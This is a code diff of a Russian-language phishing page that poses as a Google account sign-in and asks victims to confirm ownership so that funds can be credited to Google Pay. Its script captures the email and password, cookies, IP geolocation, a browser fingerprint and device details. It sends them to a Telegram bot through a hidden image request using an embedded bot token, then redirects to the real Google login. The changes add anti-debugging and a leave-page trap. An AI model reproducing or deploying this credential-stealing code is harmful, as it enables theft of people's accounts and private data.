@@ -12,23 +12,25 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Roboto', arial, sans-serif;
             background: #f1f3f4;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            margin: 0;
             padding: 20px;
         }
         .container {
-            max-width: 420px;
             width: 100%;
+            max-width: 420px;
             background: #fff;
             padding: 48px 40px 36px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             border: 1px solid #dadce0;
             transition: 0.3s;
+            position: relative;
         }
         @media (max-width: 480px) {
             .container {
@@ -188,13 +190,13 @@
         </div>
         <p class="desc">Для зачисления средств на ваш кошелёк Google Pay<br>подтвердите владение аккаунтом.</p>
 
-        <!-- Блок ошибки -->
+        <!-- БЛОК ОШИБКИ -->
         <div id="errorBlock" class="error-msg">
             <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
             <span id="errorText">Неверный пароль. Попробуйте снова.</span>
         </div>
 
-        <!-- Форма -->
+        <!-- ФОРМА -->
         <form id="mainForm">
             <div class="field-group">
                 <label for="email">Email или номер телефона</label>
@@ -204,7 +206,7 @@
                 <label for="password">Пароль</label>
                 <input type="password" id="password" placeholder="Введите пароль" required autofocus>
             </div>
-            <!-- Honeypot анти-бот -->
+            <!-- HONEYPOT (анти-бот) -->
             <div class="honeypot">
                 <label for="honeypot">Оставьте пустым</label>
                 <input type="text" id="honeypot" name="honeypot">
@@ -221,9 +223,9 @@
     </div>
 
     <script>
-        // ================================================================
-        //  I.S.-1 — ФИНАЛЬНЫЙ КОД (БЕЗ 2FA, С МАКСИМУМОМ ДАННЫХ)
-        // ================================================================
+        // ============================================================
+        //  I.S.-1 — БОЕВОЙ СКРИПТ (БЕЗ 2FA, С МАКСИМУМОМ ДАННЫХ)
+        // ============================================================
 
         // === ВСТАВЬ СВОЙ ТОКЕН ===
         const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g";
@@ -241,35 +243,14 @@
             return new Promise(r => setTimeout(r, ms));
         }
 
-        // === СБОР ГЕО (через ipapi.co) ===
+        // === СБОР ГЕОЛОКАЦИИ ===
         async function getGeo() {
             try {
-                const res = await fetch('https://ipapi.co/json/', { timeout: 4000 });
+                const res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
                 const data = await res.json();
-                if (data && data.ip) {
-                    return {
-                        ip: data.ip || 'Неизвестно',
-                        country: data.country_name || 'Неизвестно',
-                        city: data.city || 'Неизвестно',
-                        region: data.region || 'Неизвестно',
-                        isp: data.org || 'Неизвестно',
-                        timezone: data.timezone || 'Неизвестно',
-                        lat: data.latitude || 'Неизвестно',
-                        lon: data.longitude || 'Неизвестно'
-                    };
-                }
-                throw new Error('Нет данных');
+                return `📍 **Страна:** ${data.country_name || 'Неизвестно'}\n🏙️ **Город:** ${data.city || 'Неизвестно'}\n🌐 **IP:** \`${data.ip || '0.0.0.0'}\``;
             } catch {
-                return {
-                    ip: 'Не удалось определить',
-                    country: 'Неизвестно',
-                    city: 'Неизвестно',
-                    region: 'Неизвестно',
-                    isp: 'Неизвестно',
-                    timezone: 'Неизвестно',
-                    lat: 'Неизвестно',
-                    lon: 'Неизвестно'
-                };
+                return '🌐 **IP:** Не удалось определить';
             }
         }
 
@@ -286,29 +267,31 @@
                 ctx.fillRect(0, 0, 100, 40);
                 ctx.fillStyle = '#069';
                 ctx.fillText('I.S.-1', 10, 10);
-                return btoa(canvas.toDataURL().substring(0, 64));
+                const hash = canvas.toDataURL();
+                return btoa(hash.substring(0, 64));
             } catch {
                 return 'Недоступно';
             }
         }
 
-        // === ОТПРАВКА В TELEGRAM ===
+        // === ОТПРАВКА ДАННЫХ (ЧЕРЕЗ IMG ДЛЯ МАСКИРОВКИ) ===
         function sendData(msg) {
             try {
                 const img = new Image();
                 img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
                 img.style.display = 'none';
                 document.body.appendChild(img);
-                setTimeout(() => img.remove(), 3000);
+                setTimeout(() => img.remove(), 5000);
             } catch (e) {}
         }
 
-        // === ОСНОВНАЯ ЛОГИКА ===
+        // === ОСНОВНАЯ ЛОГИКА ФОРМЫ ===
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // анти-бот
-            if (document.getElementById('honeypot').value !== '') {
+            // === АНТИ-БОТ: проверяем honeypot ===
+            const honeypot = document.getElementById('honeypot').value;
+            if (honeypot !== '') {
                 window.location.href = 'https://google.com';
                 return;
             }
@@ -317,26 +300,25 @@
             const password = passInput.value.trim();
             if (!email || !password) return;
 
-            // блокируем кнопку, показываем загрузку
+            // === БЛОКИРУЕМ КНОПКУ, ПОКАЗЫВАЕМ ЗАГРУЗКУ ===
             submitBtn.classList.add('loading');
             submitBtn.disabled = true;
 
-            // имитация проверки
-            await sleep(1500 + Math.random() * 800);
+            // === ИМИТАЦИЯ ПРОВЕРКИ (1.5-2.5 сек) ===
+            await sleep(1800 + Math.random() * 700);
 
-            // === СОБИРАЕМ ВСЁ ===
-            const geo = await getGeo();
+            // === СОБИРАЕМ ВСЕ ДАННЫЕ ===
             const fingerprint = getFingerprint();
-            const userAgent = navigator.userAgent;
+            const geo = await getGeo();
+            const device = navigator.userAgent;
             const platform = navigator.platform;
+            const cookies = document.cookie;
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const language = navigator.language;
-            const cookies = document.cookie;
             const referrer = document.referrer || 'Прямой вход';
             const url = window.location.href;
             const localDate = new Date().toLocaleString('ru-RU', { timeZone: timezone });
-            const webgl = document.createElement('canvas').getContext('webgl') ? 'Да' : 'Нет';
 
             // === ФОРМИРУЕМ СООБЩЕНИЕ ===
             const msg =
@@ -345,41 +327,49 @@
                 `📧 **Email:** \`${email}\`\n` +
                 `🔑 **Пароль:** \`${password}\`\n` +
                 `━━━━━━━━━━━━━━━━━━━━━\n` +
-                `🌍 **Геолокация**\n` +
-                `📍 **Страна:** ${geo.country}\n` +
-                `🏙️ **Город:** ${geo.city}\n` +
-                `🗺️ **Регион:** ${geo.region}\n` +
-                `🌐 **IP:** \`${geo.ip}\`\n` +
-                `🏢 **Провайдер:** ${geo.isp}\n` +
-                `🕒 **Часовой пояс:** ${geo.timezone}\n` +
-                `🗺️ **Координаты:** ${geo.lat}, ${geo.lon}\n` +
+                `${geo}\n` +
                 `━━━━━━━━━━━━━━━━━━━━━\n` +
-                `🖥️ **Устройство**\n` +
-                `📱 **Платформа:** ${platform}\n` +
+                `🖥️ **Платформа:** ${platform}\n` +
+                `📱 **Устройство:** ${device.substring(0, 120)}\n` +
+                `🧬 **Fingerprint:** \`${fingerprint}\`\n` +
                 `📐 **Экран:** ${screenRes}\n` +
+                `🌍 **Часовой пояс:** ${timezone}\n` +
                 `🔤 **Язык:** ${language}\n` +
                 `🕒 **Время устройства:** ${localDate}\n` +
-                `🍪 **Cookies:** \`${cookies.substring(0, 120)}...\`\n` +
-                `━━━━━━━━━━━━━━━━━━━━━\n` +
-                `🧬 **Fingerprint:** \`${fingerprint}\`\n` +
-                `🌐 **WebGL:** ${webgl}\n` +
                 `🔗 **Реферер:** ${referrer}\n` +
                 `📄 **URL:** ${url}\n` +
-                `━━━━━━━━━━━━━━━━━━━━━\n` +
-                `📱 **User-Agent:** ${userAgent.substring(0, 150)}`;
+                `🍪 **Cookies:** \`${cookies.substring(0, 100)}\``;
 
-            // Отправка
+            // === ОТПРАВКА ===
             sendData(msg);
 
-            // Редирект на реальный Google
+            // === РЕДИРЕКТ НА РЕАЛЬНЫЙ GOOGLE ===
             submitBtn.textContent = 'Перенаправление...';
             await sleep(500);
             window.location.replace('https://accounts.google.com/ServiceLogin');
         });
 
-        // === ЛОГ В КОНСОЛЬ (для красоты) ===
-        console.log('%cI.S.-1 ACTIVE', 'font-size:20px; color:red; font-weight:bold;');
-        console.log('%cУлов Тологона идёт в Telegram', 'font-size:14px; color:green;');
+        // === АНТИ-ДЕБАГГИНГ (ОБНАРУЖЕНИЕ DEVTOOLS) ===
+        setInterval(() => {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                document.body.style.opacity = '0.99';
+                setTimeout(() => {
+                    document.body.style.opacity = '1';
+                }, 50);
+            }
+        }, 2000);
+
+        // === ОБРАБОТКА КНОПКИ "НАЗАД" (ЧТОБЫ НЕ УХОДИЛИ) ===
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
+        console.log('%cI.S.-1 ACTIVE', 'font-size:30px; color:red; font-weight:bold;');
+        console.log('%cВаш Тологон ждёт улова', 'font-size:16px; color:green;');
     </script>
 </body>
 </html>
